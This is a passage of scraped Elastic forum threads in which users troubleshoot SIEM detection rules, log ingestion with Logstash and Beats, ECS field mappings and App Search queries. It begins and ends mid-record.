\"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} sudo(?:\\[%{POSINT:[system][auth][pid]}\\])?: \\s*%{DATA:[system][auth][user]} :( %{DATA:[system][auth][sudo][error]} ;)? TTY=%{DATA:[system][auth][sudo][tty]} ; PWD=%{DATA:[system][auth][sudo][pwd]} ; USER=%{DATA:[system][auth][sudo][user]} ; COMMAND=%{GREEDYDATA:[system][auth][sudo][command]}\", \"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} groupadd(?:\\[%{POSINT:[system][auth][pid]}\\])?: new group: name=%{DATA:system.auth.groupadd.name}, GID=%{NUMBER:system.auth.groupadd.gid}\", \"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} useradd(?:\\[%{POSINT:[system][auth][pid]}\\])?: new user: name=%{DATA:[system][auth][useradd][name]}, UID=%{NUMBER:[system][auth][useradd][uid]}, GID=%{NUMBER:[system][auth][useradd][gid]}, home=%{DATA:[system][auth][useradd][home]}, shell=%{DATA:[system][auth][useradd][shell]}$\", \"%{SYSLOGTIMESTAMP:[system][auth][timestamp]} %{SYSLOGHOST:[system][auth][hostname]} %{DATA:[system][auth][program]}(?:\\[%{POSINT:[system][auth][pid]}\\])?: %{GREEDYMULTILINE:[system][auth][message]}\"] } pattern_definitions => { \"GREEDYMULTILINE\"=> \"(.|\\n)*\" } remove_field => \"message\" } date { match => [ \"[system][auth][timestamp]\", \"MMM d HH:mm:ss\", \"MMM dd HH:mm:ss\" ] } geoip { source => \"[system][auth][ssh][ip]\" target => \"[system][auth][ssh][geoip]\" } } else if [fileset][name] == \"syslog\" { grok { match => { \"message\" => [\"%{SYSLOGTIMESTAMP:[system][syslog][timestamp]} %{SYSLOGHOST:[system][syslog][hostname]} %{DATA:[system][syslog][program]}(?:\\[%{POSINT:[system][syslog][pid]}\\])?: %{GREEDYMULTILINE:[system][syslog][message]}\"] } pattern_definitions => { \"GREEDYMULTILINE\" => \"(.|\\n)*\" } remove_field => \"message\" } date { match => [ \"[system][syslog][timestamp]\", \"MMM d HH:mm:ss\", \"MMM dd HH:mm:ss\" ] } } } } /etc/logstash/conf.d/30-elasticsearch-output.conf: output { elasticsearch { hosts => [\"localhost:9200\"] manage_template => false index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" } } Server1/Server2/ServerX... (Filebeat): //I commented out: #output.elasticsearch: # Array of hosts to connect to. # hosts: [\"localhost:9200\"] //And commented in: output.logstash: # The Logstash hosts hosts: [\"1.1.1.1:5044\"] and so on... (The configuration on Server2 to ServerX for filebeat is always the same) Further information: All internal IPs are pingable I installed adoptopenjdk-11-hotspot for logstash I mainly used this tutorial to set up everything: https://www.digitalocean.com/community/tutorials/how-to-install-elasticsearch-logstash-and-kibana-elastic-stack-on-centos-7 Obviously, I replaced the IPs in the post. I did not use 1.1.1.1 in my configs Is there anyone here who can help me with this problem or provide a link if someone already had similar problems? (I wasn't able to find anything) Best regards, Arnim",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "18c29a95-e492-4328-86c0-ffeecd9a4058",
    "url": "https://discuss.elastic.co/t/signal-detection-rules/219887",
    "title": "Signal Detection Rules",
    "category": [
      "SIEM"
    ],
    "author": "tanner8302",
    "date": "February 19, 2020, 3:45am February 19, 2020, 10:37am February 19, 2020, 11:41am February 24, 2020, 7:01am February 24, 2020, 9:43pm February 29, 2020, 10:33pm March 5, 2020, 10:09am March 6, 2020, 10:23pm March 17, 2020, 4:05am April 8, 2020, 10:04am April 8, 2020, 4:28pm April 21, 2020, 11:08am",
    "body": "These don't seem to be working for me. I have enabled all rules for Linux and Windows. There are two rules based upon the whoami command. One for windows and one for linux. I performed the whoami command on both hosts and did not receive a signal detection. Is there something else that I need to do other than enabling the signal detection rules and ensuring that the appropriate *beat is feeding into my SEIM? These screen shots show the logs are making it to the discover module There is also another rule for clearing windows logs. I went into event viewer on my windows host and cleared the security, application, system logs. No detection signals. See screen shot image953×187 8.46 KB In fact the only detection signal I am receiving is the DNS to Internet signal...... Running 7.6 in Kibana, ARM, and Elasticsearch",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "a5ea8b1a-b5e4-4a7a-8be8-2b81365ba8ba",
    "url": "https://discuss.elastic.co/t/can-i-write-elastic-query-using-kql-or-lucene/227337",
    "title": "Can i write elastic query using KQL or Lucene",
    "category": [
      "SIEM"
    ],
    "author": "Saurabh_Singh1",
    "date": "April 10, 2020, 12:03pm April 10, 2020, 2:02pm April 21, 2020, 4:19am",
    "body": "I was trying to replicate watcher functionality using SIEM detection rule. In watcher i can write elastic query, but can i perform that using detection rule ? Please help.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9d9e11dc-193a-41c2-a122-3599ee7c1f1c",
    "url": "https://discuss.elastic.co/t/prebuilt-ml-jobs-fail/227309",
    "title": "Prebuilt ML jobs fail",
    "category": [
      "SIEM"
    ],
    "author": "",
    "date": "April 9, 2020, 11:55am April 9, 2020, 12:18pm April 9, 2020, 1:10pm April 9, 2020, 2:21pm April 16, 2020, 9:40am April 16, 2020, 11:35am April 16, 2020, 1:45pm April 17, 2020, 7:04pm April 20, 2020, 7:22am April 20, 2020, 1:02pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "7046ef46-e808-4c8c-aae3-752d991c83aa",
    "url": "https://discuss.elastic.co/t/elastic-siem-does-not-show-the-netflow-data-using-filebeat/228771",
    "title": "Elastic SIEM does not show the netflow data using filebeat",
    "category": [
      "SIEM"
    ],
    "author": "Minh_Ti_n_Tr_n",
    "date": "April 20, 2020, 2:58am",
    "body": "Hi all, I configured filebeat netflow module to receive netflow log from pfsense image987×504 41.1 KB It shows data received but don't show anything on visualize image1533×749 53.3 KB Any solution to solve that? Please let me know if you need any config file Thanks & Regards",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "248ed3b9-38ff-459d-bed1-bc6ecf7b74e3",
    "url": "https://discuss.elastic.co/t/rules-in-elasticsiem-not-create-signals/228068",
    "title": "Rules in ElasticSIEM not create signals",
    "category": [
      "SIEM"
    ],
    "author": "Nazarenko",
    "date": "April 15, 2020, 10:22am April 15, 2020, 11:39am April 15, 2020, 2:04pm April 16, 2020, 8:38am April 16, 2020, 2:23pm",
    "body": "Hello, i have some problem with rules in ElasticSIEM. I have a lot of indexies but in on of them rules don't working. Messages about error rules are absent. WIth one index rule are working but when i write rule for other index it no workig.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4e9c2f8f-7917-4fd1-9b24-4d1770e065d3",
    "url": "https://discuss.elastic.co/t/ecs-common-schema-taxonomies-for-other-sources/228220",
    "title": "ECS common schema taxonomies for other sources",
    "category": [
      "SIEM"
    ],
    "author": "rossw",
    "date": "April 15, 2020, 11:33pm April 16, 2020, 11:20am",
    "body": "Hi there We are looking at pushing events from a lot of our network and security devices into Elastic for storage, and utilising the SIEM functionality as well. We understand the requirement for ECS, and we have started using Logstash to transform the incoming data (mostly in custom syslog formats from the devices) into ECS. Rather than invent the wheel, is there a repository of taxonomies somewhere for different log source types (like the QRadar DSM concept)? Our devices include F5 devices, Fortigate firewalls, PA firewalls, Juniper switches and routers, lots of different types of cisco switches (with different log formats) etc. etc. etc. etc. etc. I'm hoping there is a repository of common \"extended\" ECS mappings that we can utilise, and add to. thanks Ross",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a6b93369-a1e3-4178-a5ae-bdbc7ae80039",
    "url": "https://discuss.elastic.co/t/soar-for-elk/228133",
    "title": "SOAR for elk",
    "category": [
      "SIEM"
    ],
    "author": "oumy",
    "date": "April 15, 2020, 1:38pm April 15, 2020, 10:46pm April 16, 2020, 11:03am",
    "body": "Hello there, i was wondering if there is an open source SOAR that can be integrated with elk stack, and if so how to do so? and does any of you know how too integrate PatrOwl with elk stack? Thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7dc8dffe-7c6e-488e-8ff2-169018d12771",
    "url": "https://discuss.elastic.co/t/sizing-parameters-for-deploying-siem/228240",
    "title": "Sizing Parameters for deploying SIEM",
    "category": [
      "SIEM"
    ],
    "author": "Blason",
    "date": "April 16, 2020, 4:29am",
    "body": "Hi Guys, I am planning to test out SIEM app in production and I have around 70-80 servers [60 of are those Windows/rest are all Linux/Unix] then have PAN Firewall, 4-5 Cisco routers. So around 90 off devices that needs to be monitored. the log retention period will be around 6 months. Can someone please give me insight about elastic search host sizing parameters like How many hosts I must adapt? Like one for Elastic search, other for logstash etc. If I must adopt elasticsearch cluster for data resiliency What should be the ideal memory/cpu/cores each node must have? Any other advice? TIA Blason R",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f06adcd9-ed49-414a-b3cc-abfbc3d28f67",
    "url": "https://discuss.elastic.co/t/bulkresponse-had-errors-with-response-statuses-counts-of/226492",
    "title": "bulkResponse had errors with response statuses:counts of... {",
    "category": [
      "SIEM"
    ],
    "author": "larryzhu",
    "date": "April 4, 2020, 4:00pm April 4, 2020, 4:16pm April 13, 2020, 7:01am April 13, 2020, 1:19pm April 13, 2020, 2:43pm April 15, 2020, 1:28pm",
    "body": "We consistently hit the invalid request error in elastic SIEM Found 10000 signals from the indexes of \"[oci-audit-span*]\" using signal rule name: \"OCI Audit: Delete VCN [Duplicate]\", id: \"0e2d1191-7600-4268-be75-0f13ce1e2356\", rule_id: \"4c59e3cc-92d7-4717-a019-da87a1ea66b0\", pushing signals to index \".siem-signals-default\" {\"type\":\"log\",\"@timestamp\":\"2020-04-04T02:32:06Z\",\"tags\":[\"error\",\"plugins\",\"siem\"],\"pid\":8,\"message\":\" bulkResponse had errors with response statuses:counts of... { \"400\": 100 }\"} how to troubleshoot this?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "f8f99857-3fad-483b-aa37-2a5d88444b68",
    "url": "https://discuss.elastic.co/t/ip-watch-list-functionality/223583",
    "title": "IP Watch List Functionality",
    "category": [
      "SIEM"
    ],
    "author": "",
    "date": "March 13, 2020, 9:27pm March 13, 2020, 9:49pm March 16, 2020, 5:28pm March 16, 2020, 6:17pm March 20, 2020, 7:25pm April 14, 2020, 2:40pm April 15, 2020, 5:04am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "cd094176-4706-4f19-8612-e8182541de8f",
    "url": "https://discuss.elastic.co/t/zeek-filebeat-http-and-tls-events-not-fully-populating/224830",
    "title": "Zeek filebeat - HTTP and TLS events not fully populating",
    "category": [
      "SIEM"
    ],
    "author": "lw24",
    "date": "March 24, 2020, 12:28pm March 31, 2020, 7:30pm April 12, 2020, 3:16pm April 11, 2020, 11:14am",
    "body": "I have a Security Onion VM with Filebeats on it with Zeek module enabled. I've edited the zeek.yml file to point to /nsm/bro/logs/current and have all the events being pulled through to Kibana. DNS events are fully populating with source and destination IP, however HTTP and TLS are not. HTTP events in kibana contain source and destination ports as well as the HTTP response, but don't contain IP. SSL events are the same, not populating with source and destination IP. Any advice would be really appreciated!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2cdd5e0f-2711-4de8-be7a-311c6df7afb3",
    "url": "https://discuss.elastic.co/t/siem-doesnt-show-any-winlogbeat-events-despite-es-receiving-them/224008",
    "title": "SIEM doesn't show any Winlogbeat events, despite ES receiving them",
    "category": [
      "SIEM"
    ],
    "author": "Aura",
    "date": "March 18, 2020, 12:26am March 21, 2020, 7:19pm March 22, 2020, 12:29pm March 26, 2020, 1:16pm April 1, 2020, 10:31pm April 8, 2020, 2:40am April 8, 2020, 5:13pm April 9, 2020, 3:20am April 9, 2020, 11:34am April 10, 2020, 1:55pm April 10, 2020, 8:08pm April 10, 2020, 8:38pm",
    "body": "Hi, New ELK stack user here. I just installed v7.6.1 on a Ubuntu Server 18.04 that I have running on an old Lenovo I had lying around. Took me a couple of hours to install, set up, and get working. One issue I can't seem to fix, nor explain, is that despite receiving Winlogbeat events, these aren't shown/reflected in the SIEM app, but other events (Filebeat and Packetbeat) are. I'm using Logstash in the middle, so Filebeat, Packetbeat and Winlogbeat are sending events to Logstash, which outputs them to Elasticsearch. My index patterns are all defined on the beat name: filebeat-* packetbeat-* winlogbeat-* Has anyone encountered this issue before and if so, how did you solve it? 1435×283 21.4 KB Thank you!",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "4c0551c3-83f4-4b82-a725-f7626617a7bf",
    "url": "https://discuss.elastic.co/t/detections-will-not-setup/227297",
    "title": "Detections will not setup",
    "category": [
      "SIEM"
    ],
    "author": "xennn",
    "date": "April 9, 2020, 10:32am April 10, 2020, 2:47pm April 10, 2020, 4:15pm April 10, 2020, 4:21pm April 10, 2020, 5:41pm",
    "body": "Hello, i have a problem with setup detections in SIEM. I always get a message with Let's set up your detection engine. I have logged in as a superuser i cannot see the .siem-signals index. I have check the role i have api management role and access to the siem space with create righs.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f04e25d0-8ed5-4fc0-bb72-171d355cab82",
    "url": "https://discuss.elastic.co/t/adding-a-condition-in-detection-engine/227331",
    "title": "Adding a condition in detection engine",
    "category": [
      "SIEM"
    ],
    "author": "",
    "date": "April 9, 2020, 1:36pm April 10, 2020, 1:35pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e3371785-add0-4e6b-b827-c5750d844c26",
    "url": "https://discuss.elastic.co/t/display-log-information/227380",
    "title": "Display log information",
    "category": [
      "SIEM"
    ],
    "author": "Gary_Blackwell",
    "date": "April 9, 2020, 5:45pm",
    "body": "The default display \"_source\" has a lot of uninteresting data. So I went to advanced settings and modified the default columns to be \"winlog.event_id, event.action, winlog.event_data.SubjectUserName, winlog.event_data.SubjectDomainName, winlog.event_data.ObjectType, winlog.computer_name, winlog.event_data.IpAddress, winlog.event_data.IpPort\" However, the time column is so wide it shoves my other columns off the page. I am not able to resize the columns. In addition, some entries are blank because it is a different log type. Is there a way to add multiple column headers in one column so that I can display interesting data for both a logon event and a sysmon event or any event? Thanks, Gary",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "91f47b75-37d1-458f-b8c1-56771f1d462e",
    "url": "https://discuss.elastic.co/t/no-tls-details/222593",
    "title": "No TLS details",
    "category": [
      "SIEM"
    ],
    "author": "NogNeetMachinaal",
    "date": "March 12, 2020, 3:08pm March 12, 2020, 3:57pm April 9, 2020, 3:58pm April 9, 2020, 3:58pm",
    "body": "See also attached image: SIEM - Empty TLS table1122×603 50.4 KB While there seem to be thousands of TLS handshakes, the SIEM-network table with TLS details is empty. The Packetbeat config details: - type: tls # Configure the ports where to listen for TLS traffic. You can disable # the TLS protocol by commenting out the list of ports. ports: [ 443, 993, 587, 465, 995 ] # Certificate details # WLM | 2020mar8 send_certificates: true include_raw_certificates: true include_detailed_fields: true fingerprints: [ md5, sha1, sha256 ] What am I overlooking here? Thanks - Will",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e94465d3-88e2-4726-a5fd-e74125ff1eae",
    "url": "https://discuss.elastic.co/t/host-hostname-field-data-issue-with-siem-and-auditbeat/226945",
    "title": "Host.hostname field_data issue with SIEM and auditbeat",
    "category": [
      "SIEM"
    ],
    "author": "rgeisman",
    "date": "April 7, 2020, 4:11pm",
    "body": "Hello All, I am setting up an ELK stack and auditbeat and filebeat are sending logs to logstash and ingesting them correctly in Elasticsearch. When I go to SIEM, an error is thrown in the host and network section that host.hostname, and process.name are incorrect and can't be displayed because field_data isn't set to true. Of course, you don't want to use a ton of memory, so it's best for these fields to be keywords. I have done some research on other discussions on this topic and followed the steps needed. It is reported that Logstash converts or makes these fields into text fields and then aggregations can't be created. So, host.hostname should be a keyword. I have taken all the steps to solve this, but I am still having the issue. Here are the details and steps I have taken: Auditbeat version: 7.4.0 Filebeat version: 7.4.2 The Logstash output for config file was set to: mangage_template => false The logstash index for the output was set to: index => \"%{[@metadata][beat]}-%{[@metadata][version]}\" From other posts, I followed the advice to run auditbeat setup and rebuild the index templates so the can be loaded manually. The curl command was used to output the index template from Auditbeat to JSON and Filebat like so: auditbeat export template > auditbeat.template.json I then uploaded the template to elasticsearch via curl successfully. I restarted logstash and services, deleted index patterns and indices in Kibana and it now has the new indices, index-patterns, and index templates. No dice. Still SIEM error. In ES, if I do this I just see Filebeat stuff, no Audibeat pipeline, don't know if that means something GET /_ingest/pipeline So, at this point, don't know what to try next. One thing I notice in looking at the index templates, there is a host.name field, and a host.name.keyword field. Not sure what is going on with this. Any help would be appreciated.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "450d1fb3-e618-4eb6-b8de-2cc25250b61f",
    "url": "https://discuss.elastic.co/t/signal-siem-detections-using-log-files/226667",
    "title": "Signal SIEM Detections using log files",
    "category": [
      "SIEM"
    ],
    "author": "david-vazquez",
    "date": "April 6, 2020, 9:38am April 6, 2020, 2:44pm April 6, 2020, 2:44pm",
    "body": "Hello, I ingested some data from firewall devices of which I would like to create rules in the Detections part of the Elastic SIEM. I created a rule to detect Malware using a field of the log file which has that information. The problem is I only have logs from a brief secuence of time (only a month of logs). I´m configuring in the SIEM calendar the value \"Last 90 days\", but no signals are shown from that period of time (logs are from March). If I use the KQL query into Discover of Kibana, it works properly, so I think rule should be working. My doubt is: why can´t I see the signal against this \"old\" file? Should be new data introduced again in Elasticsearch after rule is created? can´t I see signals using this period of time? Thank you all. Greetings",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2e713b6d-c81f-4ed7-a429-206922321ffd",
    "url": "https://discuss.elastic.co/t/how-to-handle-network-direction-unknown/226143",
    "title": "How to handle network.direction:unknown?",
    "category": [
      "SIEM"
    ],
    "author": "hilt86",
    "date": "April 2, 2020, 12:15am April 4, 2020, 4:25pm April 4, 2020, 4:29pm",
    "body": "I'm getting detections where the network.direction is \"unknown\". Upon investigation this is just the source port from a vulnerability scanner (Detectify) : \"destination\": { \"bytes\": 4128, \"ip\": \"52.17.98.131\", \"port\": 5802, \"packets\": 33}, \"source\": { \"port\": 80, \"packets\": 19, \"bytes\": 7590, \"ip\": \"10.128.0.2\" } Obviously this looks like a false positive - if the engine isn't sure whether the source is destination or vice-versa there are going to be a lot of false positives. Is it correct to assume this is being alerted out of caution so that a human can investigate?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3488837e-4fb1-4ee3-a26c-41c6c9bdd24a",
    "url": "https://discuss.elastic.co/t/shodan-integration/223425",
    "title": "Shodan Integration",
    "category": [
      "SIEM"
    ],
    "author": "hilt86",
    "date": "March 12, 2020, 11:33pm March 17, 2020, 2:30am March 17, 2020, 11:46pm March 26, 2020, 7:15am April 1, 2020, 12:41pm",
    "body": "Has anyone managed to get Shodan.io alerts into Elastic SIEM? I'm trying to use kubi-ecs-logger logging library and the shodan python api to send ECS alerts and wondered if anyone is interested in collaborating? H",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "5b06c6e7-cc99-4ff0-9237-fb353cb48c36",
    "url": "https://discuss.elastic.co/t/siem-detections-false-positive/219287",
    "title": "SIEM detections false positive",
    "category": [
      "SIEM"
    ],
    "author": "danielsnelling",
    "date": "February 14, 2020, 1:13pm February 14, 2020, 1:14pm February 14, 2020, 1:36pm February 15, 2020, 11:08am March 2, 2020, 9:50pm",
    "body": "We've upgraded our stack to 7.6.0 yesterday, and we love the new Detections mechanism! I'm aware these are in beta, but some of the definitions have a boolean 'or' where there should be an 'and'. This is particularly where the rule is ' from/to the Internet'. eg. SMB Activity to the Internet definition is 'network.transport: tcp and destination.port: (139 or 445) and ( network.direction: outbound or ( source.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) and not destination.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) ) )' This will result in detections for '10.0.0.1 to 10.0.0.2:445' when it shouldn't. I've highlighted the 'or' that should be changed to 'and'",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d138c1c5-734f-4c08-b626-3114a20187ca",
    "url": "https://discuss.elastic.co/t/7-6-1-siem-not-showing-packetbeat-flow-asn-info/225293",
    "title": "7.6.1 SIEM not showing packetbeat flow asn info",
    "category": [
      "SIEM"
    ],
    "author": "willemdh",
    "date": "March 26, 2020, 9:07pm March 27, 2020, 7:29am",
    "body": "Hello, I was trying to enrich our flow data a bit from our Packetbeat data. Adding geoip data worked fine and showed up in SIEM, but I have some isues getting ASN info shown correctly in SIEM. So I made this processor: PUT _ingest/pipeline/geoip-info { \"description\": \"Add geoip info\", \"processors\": [ { \"geoip\": { \"field\": \"client.ip\", \"target_field\": \"client.geo\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"client.ip\", \"target_field\": \"client.as\", \"database_file\": \"GeoLite2-ASN.mmdb\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"source.ip\", \"target_field\": \"source.geo\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"source.ip\", \"target_field\": \"source.as\", \"database_file\": \"GeoLite2-ASN.mmdb\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"destination.ip\", \"target_field\": \"destination.geo\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"destination.ip\", \"target_field\": \"destination.as\", \"database_file\": \"GeoLite2-ASN.mmdb\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"server.ip\", \"target_field\": \"server.geo\", \"ignore_missing\": true } }, { \"geoip\": { \"field\": \"server.ip\", \"target_field\": \"server.as\", \"database_file\": \"GeoLite2-ASN.mmdb\", \"ignore_missing\": true } } ] } And added pipeline: \"geoip-info\" to the output in packetbeat.yml. The as fields are added to the packetbeat data: But for some reason the ASN data is not shown in SIEM. Not sure why, I did notice a difference and that there is also as.organization.name in the latest ECS versions. Maybe SIEM doesn't work with as.organization_name? Grtz Willem",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4d900a0d-543f-4b3c-9661-22aee821ede1",
    "url": "https://discuss.elastic.co/t/sum-of-source-bytes-seems-impossibly-large/219961",
    "title": "Sum of source bytes seems impossibly large",
    "category": [
      "SIEM"
    ],
    "author": "willemdh",
    "date": "March 5, 2020, 12:30pm March 5, 2020, 10:12am March 5, 2020, 11:29am March 5, 2020, 12:47pm March 6, 2020, 10:12am March 26, 2020, 8:40am March 26, 2020, 10:33am",
    "body": "Hello, Was browsing through Kibana SIEM on 7.5.2 and discovered some weird 'Bytes In', 'Bytes Out' metrics. After investigating, it seemd like some servers were sending huge amounts of traffic to my Elastic ingest nodes. I'm talking about 45 TB / 24 hours to each ingest node... After some investigation, this data came from the flow packetbeat module: packetbeat.flows: timeout: 30s period: 10s image1207×162 8.65 KB image1772×248 21.5 KB So what is going on here? How does the Packetbeat flow functionality calculate source.bytes? The result is that Kibana network SIEM shows very weird results.. Is this a known issue? Grtz Willem",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d2a96f0d-b2e8-48b1-91f7-62ee243c8f06",
    "url": "https://discuss.elastic.co/t/about-the-app-search-category/159239",
    "title": "About the App Search category",
    "category": [
      "App Search"
    ],
    "author": "warkolm",
    "date": "December 4, 2018, 12:16am",
    "body": "App Search is a search solution that simplifies the building of rich search experiences for software applications of every kind — from ecommerce websites, to SaaS applications, to mobile apps.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a3e6ec74-ec87-455b-bd07-61aa841a3c12",
    "url": "https://discuss.elastic.co/t/hide-or-modify-button-on-searchbox/228451",
    "title": "Hide or Modify button on SearchBox",
    "category": [
      "App Search"
    ],
    "author": "georgina",
    "date": "April 17, 2020, 5:11am April 20, 2020, 1:20pm April 21, 2020, 9:08pm April 22, 2020, 1:11pm",
    "body": "Hi, I'm using search-ui and am attempting to make a simple modification of the SearchBox to change the search button ( replace \"search\" with an icon). I see from the docs https://github.com/elastic/search-ui/blob/master/ADVANCED.md#searchbox the example: <SearchBox inputView={({ getAutocomplete, getInputProps, getButtonProps }) => ( <> <div className=\"sui-search-box__wrapper\"> <input {...getInputProps({ placeholder: \"I am a custom placeholder\" })} /> {getAutocomplete()} </div> <input {...getButtonProps({ \"data-custom-attr\": \"some value\" })} /> </> )} /> But when I use this the search box looses focus after entering a char. I've placed this code inside header = { } My google searches suggest that this is because it is re-rendering after each char. But I am not sure how to implement this differently. I can change the actual input element via inputProps={{ placeholder: \"Search...\" , className: \"input-class\"}} Is there no similar way to change the submit props? Thanks Georgina.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8dcf22e6-501d-42f7-89ac-ccca42a40c59",
    "url": "https://discuss.elastic.co/t/help-setting-up-app-search-using-docker-with-xpack-enabled-error-cant-connect-to-elastic-backend/229035",
    "title": "Help setting up App-search using Docker with xpack enabled - Error can't connect to elastic backend",
    "category": [
      "App Search"
    ],
    "author": "varunharidas",
    "date": "April 21, 2020, 12:48pm April 22, 2020, 12:14pm",
    "body": "Hey, I can successfully run app-search with my configuration without pack security enabled, however, I need security as I'm querying the search API from my frontend and the hsotname is public. I can verify my elastic is running fine by entering the bash of my container and running curl -u username:pass http://localhost:9200 But the app search returns an error saying Failed to connect to Elasticsearch backend. Make sure it is running. , also I cannot do the curl from the app search container bash, I think that container doesn't have access to the elastic node. Here is my docker-compose file `version: '2' services: elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:7.6.2 environment: - \"node.name=es-node\" - \"discovery.type=single-node\" - \"cluster.name=app-search-docker-cluster\" - \"bootstrap.memory_lock=true\" - ELASTICSEARCH_PASSWORD=Mypassword - ELASTICSEARCH_USERNAME=elastic - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml hostname: elasticsearch appsearch: image: docker.elastic.co/app-search/app-search:7.6.2 environment: - elasticsearch.host=http://elasticsearch:9200 ## also tried localhost - \"allow_es_settings_modification=true\" - \"app_search.external_url: https://elastic.domain.com\" - \"JAVA_OPTS=-Xms2g -Xmx2g\" - \"app_search.auth.source: standard\" - \"elasticsearch.username: elastic\" - \"elasticsearch.password: Mypassword\" ports: - 3002:3002",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d042a3c3-a708-4491-9993-4822a9942af6",
    "url": "https://discuss.elastic.co/t/efficient-query-with-multiple-boolean-flags/227367",
    "title": "Efficient query with multiple boolean flags",
    "category": [
      "App Search"
    ],
    "author": "gpribi",
    "date": "April 9, 2020, 4:33pm April 22, 2020, 1:10pm April 21, 2020, 3:32am April 21, 2020, 11:29am April 21, 2020, 11:55am April 22, 2020, 1:10pm April 21, 2020, 10:35pm",
    "body": "Hello, in the \"real world\" the entities I need to search have many yes/no characteristics which I need to filter in AppSearch (for example, \"is retailer\", \"accepts credit card\", \"accepts crypto\", etc). Users may filter throug one o many of this characteristics. If more than one is selected, all of them must be meet. What's the most efficient way to store and filter in this scenario? The obvious way is to have one field for each characteristic with a \"true\"/\"false\" or 1/0 value, but that will be a problem each time I add a new characteristic. I thought storing the characteristics in a single CSV field, but the text filter doesn't allow wildcards. I also thought in single field numeric alternatives, but the filter doesn't allow basic math operators like MOD or LOG to disaggregate that number Thank you in advance",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b0f31233-d4e2-451d-8833-3437173778eb",
    "url": "https://discuss.elastic.co/t/app-search-with-minimum-should-match-query/228632",
    "title": "App Search with minimum_should_match query",
    "category": [
      "App Search"
    ],
    "author": "sonhle",
    "date": "April 18, 2020, 10:01am April 20, 2020, 1:04pm April 20, 2020, 1:25pm April 20, 2020, 1:31pm April 20, 2020, 2:35pm",
    "body": "Hi all, I am new to Elastic App Search. I am using @elastic/app-search-javascript 7.6.0 to do the search. When I tried to search \"Food 1\" (without quote, I don't want do have an exact search), I got all the documents with \"1\" as well. How to deal with this? I tried to use minimum_should_match from query_string like this as from ElasticSearch document const query = {query: { query_string: { query: str, fields: [\"title\", \"tags\", \"keywords\"], minimum_should_match: \"75%\" } } } ... client.search(query, options) .... However, app search document api throw the error Error: [400] Query must be a string or number. Thank you in advance for the help.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6abc6f02-0aae-4fbc-a267-2c5ba9bb48fa",
    "url": "https://discuss.elastic.co/t/passing-min-score-to-elastic-in-query/227032",
    "title": "Passing min_score to elastic in query",
    "category": [
      "App Search"
    ],
    "author": "Dan_Leng",
    "date": "April 8, 2020, 12:30am April 13, 2020, 4:03pm April 20, 2020, 1:21pm",
    "body": "Hi, I'm interested in passing the min_score option to elastic when searching via App Search (from javascript), as described in the elastic docs: https://www.elastic.co/guide/en/elasticsearch/reference/6.8/search-request-min-score.html When I try to do pass that option in my query, App Search throws with the error: Options contains invalid key: min_score Is there a way to pass other options that are available in elastic search but are not necessarily called out in the App Search wrapper? Perhaps there is an escape hatch that I can use to execute a \"raw\" elastic query like when you're using a DB ORM, can't get it to do what you want, and just want to write the SQL query? Specifically, I want to do this for 2 reasons... I don't want to display results that are very far off from the query to my users. I want to get a list of facets that apply to my results (with counts) but I don't want facets pertaining to results that are far down the list to be returned.... i.e. it would be great to cut off my list at a point that I define using min_score, so I don't get facets pertaining to the 1000th result returned. Any help appreciated, Dan",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a51ef933-5e0d-4304-9c77-94699ba498f9",
    "url": "https://discuss.elastic.co/t/customize-result-component-and-its-reponses/228759",
    "title": "Customize result component and its reponses",
    "category": [
      "App Search"
    ],
    "author": "MinHan",
    "date": "April 19, 2020, 7:43pm April 20, 2020, 12:55pm",
